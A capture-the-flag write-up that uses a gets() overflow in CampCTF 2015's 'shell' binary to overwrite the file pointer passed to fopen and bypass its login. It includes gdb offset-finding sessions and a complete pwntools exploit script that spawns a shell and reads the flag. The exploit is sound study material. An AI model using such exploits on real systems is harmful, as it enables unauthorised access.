# Overwrite File Pointer


This technique can be used to redirect the workflow of a binary by overwriting the file pointer which is being used. To elaborate on this more, we are going to take `shell` from CampCTF 2015.

### Reverse Engineering

Firstly, let's run the program in `ltrace` to see what is going on:-

```r
d4mianwayne@oracle:~/Pwning/unknown$ ./shell 
$ help
sh whoami date exit ls help hlep login
$ whoami
d4mianwayne
$ ls
creds.txt  shell 
$ cat creds.txt
Command not found
$ sh
Permission denied
$ login 
Command not found
$ login
Username: hello
Password: world
Authentication failed!
$ ^C
```

So, now we know that there is an authentication system, `ls`, `sh` which gives `permission denied` error, seems like we can't use unless we are authorized and we can't use the `cat`. Let's check the main:-

```C
  v22 = 0;
  v21 = argc;
  v20 = argv;
  filename = "creds.txt";
  v15 = 0;

  -- snip --

  
    printf("Username: ", "login");
    gets(&v16);
    printf("Password: ");
    HIDWORD(v6) = gets(&v17);
    stream = fopen(filename, "r");
    for ( lineptr = 0LL; ; lineptr = 0LL )
    {
      n = 0LL;
      v11 = getline(&lineptr, &n, stream);
      if ( v11 < 0 )
      {
        free(lineptr);
        goto LABEL_12;
      }
      lineptr[v11 - 1] = 0;
      s2 = strtok(lineptr, ":");
      v8 = strtok(0LL, ":");
      if ( s2 )
      {
        if ( v8 && !strcmp((const char *)&v16, s2) && !strcmp((const char *)&v17, v8) )
          break;
      }
      free(lineptr);
    }
    v3 = puts("Authenticated!");
    v14 = 35;
    v15 = 1;
    LODWORD(v6) = v3;
```

There is a `gets`, which means we have a buffer overflow here and after that we have a `stream` variable which seems to contain the `IO` buffer of a `filename` which is `creds.txt` and after that there seems to a delimiter:` which seems to be splitting the credentials in 2 parts, first one being `username` and second one being `password`. 


Now, since we can use the `gets` to overwrite the `filename` pointer to any other file which contains a delimiter `:` then we can get authenticated. Let's check if we can use any library which satisfy our conditions.

```r
gdb-peda$ searchmem /lib64/ld-linux-x86-64.so.2
Searching for '/lib64/ld-linux-x86-64.so.2' in: None ranges
Found 2 results, display max 2 items:
shell : 0x400200 ("/lib64/ld-linux-x86-64.so.2")
 libc : 0x7ffff7ba1d50 ("/lib64/ld-linux-x86-64.so.2")
gdb-peda$ searchmem libc.so.6
Searching for 'libc.so.6' in: None ranges
Found 6 results, display max 6 items:
     shell : 0x400431 ("libc.so.6")
      libc : 0x7ffff79fb76f ("libc.so.6")
ld-2.27.so : 0x7ffff7df8790 ("libc.so.6")
    mapped : 0x7ffff7fd7490 ("libc.so.6")
    mapped : 0x7ffff7fd74b6 ("libc.so.6")
    mapped : 0x7ffff7ffede6 ("libc.so.6")
gdb-peda$ x/s 0x400431
0x400431:	"libc.so.6"
gdb-peda$ 
```

Ahah, we have the dynamically loaded libraries address, we can use either of them. In this case, we need an absolute path for a file, we don't have one for `libc.so.6`, so we will use `/lib64/ld-linux-x86-64.so.2` stored at `0x400200` as it has the absolute address. 


Checking for `:` delimiter:-

```r
d4mianwayne@oracle:~/Pwning/unknown$ strings -a /lib64/ld-linux-x86-64.so.2 | grep ":" 
|F:m
:v1<:w
:vIH
<$:u
:/lib
t:f.


AT_??? (0x%s): 0x%s
%s: %s: %s%s%s%s%s
%s: error: %s: %s (%s)
conflict processing: %s
ERROR: ld.so: object '%s' from %s cannot be preloaded (%s): ignored.
runtime linker statistics:


-- snip --


```

There were lots of it, but we will use any from it.

### Finding Offset for File Pointer

As binary is not stripped, we can use `gdb` and then do `disas main` and set up a breakpoint at `fopen` and check the `rdi` register since that would be the register which contains file pointer of `creds.txt`.

Now, off to `gdb`:-

```r
-- snip --

   0x0000000000400c7b <+251>:	mov    al,0x0
   0x0000000000400c7d <+253>:	call   0x400790 <gets@plt>
   0x0000000000400c82 <+258>:	movabs rsi,0x400f9f
   0x0000000000400c8c <+268>:	mov    rdi,QWORD PTR [rbp-0x18]
   0x0000000000400c90 <+272>:	mov    DWORD PTR [rbp-0xdc],eax
   0x0000000000400c96 <+278>:	call   0x4007b0 <fopen@plt>
   0x0000000000400c9b <+283>:	mov    QWORD PTR [rbp-0x90],rax
   0x0000000000400ca2 <+290>:	mov    QWORD PTR [rbp-0x98],0x0
   0x0000000000400cad <+301>:	lea    rdi,[rbp-0x98]
   0x0000000000400cb4 <+308>:	lea    rsi,[rbp-0xa8]

-- snip -- 
```

Let' set up a breakpoint at `0x0000000000400c96`, now we will do `pattern create` to create a pattern and trigger the vulnerability in `login`.

```r
gef➤  b *0x0000000000400c96
Breakpoint 1 at 0x400c96
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
gef➤  
gef➤  r
Starting program: /home/d4mianwayne/Pwning/unknown/shell 
$ login
Username: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
Password: login
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdd94  →  0x6161006e69676f6c ("login"?)
$rbx   : 0x0               
$rcx   : 0x00007ffff7dcfa00  →  0x00000000fbad2288


-- snip --

───────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
fopen@plt (
   $rdi = 0x6161616e61616161,
   $rsi = 0x0000000000400f9f → 0x68747541003a0072 ("r"?),
   $rdx = 0x00007ffff7dd18d0 → 0x0000000000000000,
   $rcx = 0x00007ffff7dcfa00 → 0x00000000fbad2288
)
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "shell", stopped 0x400c96 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400c96 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x0000000000400c96 in main ()
gef➤  x/s $rdi
0x6161616e61616161:	<error: Cannot access memory at address 0x6161616e61616161>
gef➤  pattern search 0x6161616e61616161
[+] Searching '0x6161616e61616161'
[+] Found at offset 100 (little-endian search) likely
[+] Found at offset 101 (big-endian search) 
gef➤  


```

So, the offset to the file pointer is 100. Now, we can redirect the flow with our payload being:-


```t
-----------------------------------------------------
| "A"*100                   |   0x400200            |
-----------------------------------------------------
```

Now, time to write an exploit:-



### Pwning Time

Let's make a script:-

```python
from pwn import *

p = process("./shell")
payload = b"A"*100
payload += p64(0x400200) # Address of `/lib64/ld-linux-x86-64.so.2`

p.sendlineafter(b"$ ", b"login") # Vulnerable Function

p.sendlineafter(b": ", payload) # `gets` used
p.sendlineafter(b": ", b"") # Fake entry
p.sendlineafter(b"$ ", b"login") # Calling `login`
p.sendlineafter(b": ", b"calling init") # Sending `username`
p.sendlineafter(b": ", b" %s") # Sending `password`
p.interactive()

```
Now, we can run the exploit:-

```r
d4mianwayne@oracle:~/Pwning/unknown$ python3 shell.py 
[+] Starting local process './shell': pid 8021
[*] Paused (press any to continue)
[*] Switching to interactive mode
Authenticated!
# $ cat flag.txt
Command not found
# $ sh
$ cat flag.txt
PwnLand{FilePointer_Overwrite}
$ 
[*] Interrupted
```


Done!